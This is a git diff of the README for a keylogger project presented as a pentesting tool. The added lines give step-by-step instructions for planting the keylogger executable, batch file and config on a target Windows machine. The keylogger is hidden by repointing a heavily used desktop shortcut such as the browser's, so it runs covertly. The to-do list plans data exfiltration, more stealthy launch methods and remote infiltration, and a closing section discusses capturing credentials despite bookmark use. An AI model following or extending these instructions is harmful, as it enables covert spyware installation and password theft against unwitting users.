@@ -30,17 +30,18 @@ On target system:
 
 1). Achieve administrator privileges (not covered here).  This is where the art of pentesting comes in.    
 
-2). Upload crash_backup.exe and Visuals.txt, and create a folder to house both files.  Ex: C:\Config\Visuals.txt 
-    C:\Config\crash_backup.exe. 
+2). Upload crash_backup.exe, Visuals.txt, and launch.bat - create a folder to house these files.  Ex: C:\Config\Visuals.txt, C:\Config\crash_backup.exe, C:\Config\launch.bat.
 
-3). 
+3). Find a desktop shortcut that seems to get a lot of use, like a browser.  Right click the shortcut, then click properties.  Change the address in the target field to be that of launch.bat.  When this shortcut is used, it will also start our keylogger.  
 
+4). Exfiltrate the data (coming soon).
 
 
 ## To Do
 
-- Convert crash_backup.pyw to executable file containing all necessary modules and libraries.  We do this beause the target is very      unlikely to have pyHook, etc. installed (or even Python).  
-- Exfiltration program for keylogger output.  
+- Exfiltration program for keylogger output.
+- More ways to run the keylogger.  Currently it can only 'piggyback' off desktop shortcuts, but many people also use the toolbar.  
+- Infiltration program for keylogger code if remote access to target system is being used.  
 
 
 ## Known Errors
@@ -48,7 +49,7 @@ On target system:
 - Changing the Target of a browser shortcut also changes the thumbnail to be that of a batch file rather than the browser thumbnail.
 
 
-## Future Additions & Theories
+## Future Features & Theories
 
 Most people have important URLs saved as bookmarks in their browser.  In addition to being convenient, this also protects the user from   phishing attacks that rely on the victim clicking a spoofed URL.  Bookmarks also hinder keylogging schemes by removing context from       captured usernames and passwords.  If a user searches for "facebook" then enters credentials, the log output shows this information in     sequence - if the user clicks a bookmark then enters credentials, all we have is a click event followed by credentials.
 
